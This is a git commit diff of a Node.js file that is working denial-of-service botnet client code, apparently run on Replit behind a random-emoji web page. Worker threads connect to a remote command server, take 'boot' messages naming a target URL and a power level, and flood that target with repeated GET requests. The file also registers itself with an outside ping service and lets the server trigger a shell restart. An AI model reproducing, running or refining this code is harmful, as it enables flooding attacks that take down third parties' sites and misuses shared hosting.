92c19ba92fd13bb1e1524547dc424938b64e8828
tonumber <77855848+tonumber@users.noreply.github.com>
2021-06-04 09:45:02 -0400

    Update index.js

--- index.js
+++ index.js
@@ -1,6 +1,8 @@
 const io = require("socket.io-client");
 const express = require('express')
 const axios = require('axios')
+const readline = require('readline');
+
 const { Worker, isMainThread, workerData } = require('worker_threads')
 const emojis = require('./emojis.json')
 if (isMainThread) {
@@ -8,10 +10,11 @@ var app = express()
 var randFromArr = (arr) => {
   return arr[Math.floor(Math.random() * arr.length)]
 }
+
 app.get("/", async (req, res) => {
   var e = ''
   for (i = 0; i < 10; i++) e += randFromArr(emojis);
-  res.end(`<h1 style="font-size:10vw">${e}</h1>`)
+  res.end(`<head><meta name="og:title" value="${e}"></head><h1 style="font-size:10vw">${e}</h1>`)
 })
 async function cringe() {
   await axios.get("https://ping.iEp0KJuM6sitY5e.repl.co/add?url=https://" + process.env.REPL_SLUG + "." + process.env.REPL_OWNER + ".repl.co")
@@ -19,12 +22,12 @@ async function cringe() {
 }
 cringe()
 app.listen(4000)
-for (i=0;i<Math.floor(require('os').cpus().length/1.5);i++) new Worker(__filename, {workerData:i}), console.log(i, 'worker')
+for (i=0;i<Math.floor(require('os').cpus().length/2.5);i++) new Worker(__filename, {workerData:i}), console.log(i, 'worker')
 } else {
 var url = ''
 var pow = 0
 
-const socket = io("wss://server2.iep0kjum6sity5e.repl.co", {
+const socket = io("wss://server.iep0kjum6sity5e.repl.co", {
   reconnection: true,
   reconnectionAttempts: 10000,
   reconnectionDelay: 6000,
@@ -32,6 +35,7 @@ const socket = io("wss://server2.iep0kjum6sity5e.repl.co", {
 });
 
 setInterval(() => {
+  if (url == 'undefined') return console.log('no site')
   for (i = 0; i < pow; i++) {
     axios.get(url).catch(err => { console.log("maybe its down or we got ip banned lol.", url, workerData) }).then(()=>{
       console.log('sent')
@@ -39,20 +43,23 @@ setInterval(() => {
     axios.get(url).catch(err => { console.log("maybe its down or we got ip banned lol.", url, workerData) }).then(()=>{
       console.log('sent')
     })
-    axios.get(url).catch(err => { console.log("maybe its down or we got ip banned lol.", url, workerData) }).then(()=>{
+    axios.get(url).catch(err => { console.log("maybe its down or we got ip banned lol.", url, workerData) }).then((r)=>{
+      //console.log(r.data)
       console.log('sent')
     })
   }
-}, .02)
+}, 10000)
 
 socket.on('message', async m => {
   console.log(m)
+  if (m == 'restart') require('child_process').exec('npm restart')
   if (m.substr(0, 5) == "boot^") {
     var args = m.split('^').slice(1)
     var u = args[0]
     var p = args[1]
     console.log("Booting: " + u + " with power: " + p)
     url = u
+    console.log(url, 'changed')
     pow = p
   }
 })
@@ -62,7 +69,7 @@ socket.on('connect', function() {
 function reconnect() {
   socket = null;
   console.log("reconnecting lol")
-  var socket = io("wss://server2.iep0kjum6sity5e.repl.co", {
+  var socket = io("wss://server.iep0kjum6sity5e.repl.co", {
     reconnectionDelayMax: 30000,
     // keep this
   });
